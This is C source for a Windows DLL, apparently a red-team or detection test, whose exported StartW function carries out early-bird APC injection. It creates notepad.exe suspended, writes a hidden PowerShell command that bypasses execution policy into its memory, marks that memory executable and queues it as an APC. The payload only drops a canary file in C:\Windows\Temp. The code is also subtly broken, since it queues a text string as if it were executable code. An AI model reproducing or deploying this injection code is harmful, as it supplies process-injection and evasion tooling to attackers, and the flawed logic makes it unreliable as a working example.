#include <windows.h>
#include <stdio.h>

__declspec(dllexport) void CALLBACK StartW(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    // The injected command now drops the canary file directly, removing the need for stage2.ps1
    char cmd[] = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \""
                 "New-Item -Path C:\\Windows\\Temp\\injection_canary.txt -ItemType File -Force; "
                 "Add-Content -Path C:\\Windows\\Temp\\injection_canary.txt -Value 'Injection successful via DLL at $(Get-Date)'\"";
                 
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    
    // Create notepad.exe in a suspended state
    if (CreateProcessA(NULL, "C:\\Windows\\System32\\notepad.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
    {
        SIZE_T cmdLen = strlen(cmd) + 1;
        LPVOID pRemoteCmd = VirtualAllocEx(pi.hProcess, NULL, cmdLen, MEM_COMMIT, PAGE_READWRITE);
        WriteProcessMemory(pi.hProcess, pRemoteCmd, cmd, cmdLen, NULL);

        DWORD oldProtect;
        VirtualProtectEx(pi.hProcess, pRemoteCmd, cmdLen, PAGE_EXECUTE_READ, &oldProtect);

        QueueUserAPC((PAPCFUNC)pRemoteCmd, pi.hThread, 0);

        ResumeThread(pi.hThread);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}
